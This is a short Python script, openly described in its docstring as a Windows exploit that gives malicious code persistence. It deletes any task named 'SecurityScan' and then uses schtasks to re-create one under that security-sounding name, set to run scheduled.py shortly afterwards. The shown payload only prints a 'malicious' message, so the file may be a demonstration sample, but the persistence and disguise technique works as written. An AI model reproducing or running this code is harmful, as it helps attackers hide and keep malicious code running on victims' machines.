import os, random
from datetime import datetime, timedelta


def manipulate_scheduled_task():
    """
    A Windows-only exploit, designed to take advantage of Scheduled Tasks on Windows. This script adds persistance to the malicious code by utilising a repeating scheduled task. 
    """

    if os.system("schtasks /query /tn SecurityScan") == 0:
        os.system("schtasks /delete /f /tn SecurityScan")

    print ("I am a malicious print")

    file_dir = os.path.join(os.getcwd(), "scheduled.py")

    max_interval = 1
    interval = 1+(random.random()*(max_interval-1))
    dt = datetime.now() + timedelta(minutes=interval)
    t = "%s:%s"%(str(dt.hour).zfill(2), str(dt.minute).zfill(2))
    d = "%s/%s/%s"%(dt.month, str(dt.day).zfill(2), dt.year)
    os.system('schtasks /create /tn SecurityScan /tr "'+file_dir+'" /sc once /st '+t+' /sd ' + d)
    input()

manipulate_scheduled_task()